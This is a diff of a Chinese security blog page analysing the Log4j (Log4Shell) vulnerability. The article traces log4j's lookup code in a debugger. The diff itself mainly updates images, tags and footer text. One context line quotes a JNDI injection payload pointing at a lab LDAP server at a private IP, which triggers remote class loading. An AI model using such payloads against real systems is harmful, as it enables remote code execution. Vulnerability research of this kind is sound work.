@@ -17,11 +17,15 @@
 <meta property="og:site_name" content="Sn1pEr&#39;s blog">
 <meta property="og:description" content="复现其实刚出没几天就复现完了（payload到处飞，好几天了都），但主要是漏洞原理一直没怎么搞明白，现在简单记录一下。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sn1per-ssd.github.io/log4j%E5%A4%8D%E7%8E%B0/image-20220720221413.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/log4j%E5%A4%8D%E7%8E%B0/image-20220720231451.png">
 <meta property="article:published_time" content="2022-01-03T10:51:53.000Z">
-<meta property="article:modified_time" content="2022-07-20T15:29:12.000Z">
+<meta property="article:modified_time" content="2024-09-23T15:35:21.224Z">
 <meta property="article:author" content="Sn1pEr">
 <meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sn1per-ssd.github.io/log4j%E5%A4%8D%E7%8E%B0/image-20220720221413.png">
   
     <link rel="alternative" href="/atom.xml" title="Sn1pEr&#39;s blog" type="application/atom+xml">
   
@@ -273,7 +277,7 @@ var _hmt = _hmt || [];
 <p>一路下断点步入和强制步入，追到<code>\org\apache\logging\log4j\core\pattern\MessagePatternConverter.class</code>的116行，关键代码如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.config != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.noLookups) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">          String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">          workingBuilder.setLength(offset);</span><br><span class="line">          workingBuilder.append(<span class="keyword">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在这里的if语句会对当前字符与下一字符进行检查，若当前字符为<code>$</code>且下一字符为<code>&#123;</code>时，他会对log日志的内容进行切割（WorkBuilder为其内容），得到<code>$&#123;jndi:ldap://192.168.80.128:1389/4vzwvt&#125;</code></p>
-<p><img src=""></p>
+<p><img src="/./log4j%E5%A4%8D%E7%8E%B0/image-20220720221413.png"></p>
 <p>当其对event中的内容进行替换时，进入<code>org\apache\logging\log4j\core\lookup\StrSubstitutor.class</code>中的311行的<code>private int substitute(final LogEvent event, final StringBuilder buf, final int offset, final int length, List&lt;String&gt; priorVariables)</code>方法，</p>
 <p>在327行有这么一行代码，用于匹配字符前缀（即<code>$&#123;</code>）：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> startMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br></pre></td></tr></table></figure>
@@ -283,7 +287,7 @@ var _hmt = _hmt || [];
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String varValue = <span class="keyword">this</span>.resolveVariable(event, varName, buf, startPos, pos);</span><br></pre></td></tr></table></figure>
 <p>步入该方法，映入眼帘的正是lookup。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="keyword">int</span> startPos, <span class="keyword">final</span> <span class="keyword">int</span> endPos)</span> </span>&#123;</span><br><span class="line">    StrLookup resolver = <span class="keyword">this</span>.getVariableResolver();</span><br><span class="line">    <span class="keyword">return</span> resolver == <span class="keyword">null</span> ? <span class="keyword">null</span> : resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src=""></p>
+<p><img src="/./log4j%E5%A4%8D%E7%8E%B0/image-20220720231451.png"></p>
 <p>成功弹出计算器</p>
 <h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>吃喝玩乐摸了一整年，让我从菜逼变成了大菜逼，只好现在在工作之余努力跟上，此文引以为戒。文章水平不高，也请大佬轻喷</p>
 
@@ -324,6 +328,10 @@ var _hmt = _hmt || [];
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
         		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
+        		</li>
       		
 		</ul>
 	</div>
@@ -334,7 +342,7 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        			<a href="/categories/代码审计//" class="article-tag-list-link color5">代码审计</a>
         		</li>
       		
 		</ul>
@@ -496,7 +504,7 @@ gitalk.render('gitalk-container')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021-2022 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
+    		&copy; 2021-2024 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
     	</div>
       	<div class="footer-right">
 			
@@ -619,11 +627,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -639,23 +655,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+                <a href="javascript:void(0)" class="js-tag color5">java</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color3">范围</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">配置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -679,6 +691,14 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
@@ -699,11 +719,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">代理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">yii</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -719,15 +747,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">代理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tips</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -735,7 +755,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color5">tips</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -743,11 +763,15 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">汇编语言</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+                <a href="javascript:void(0)" class="js-tag color5">绕过方法</a>
               </li>
              
               <li class="article-tag-list-item">
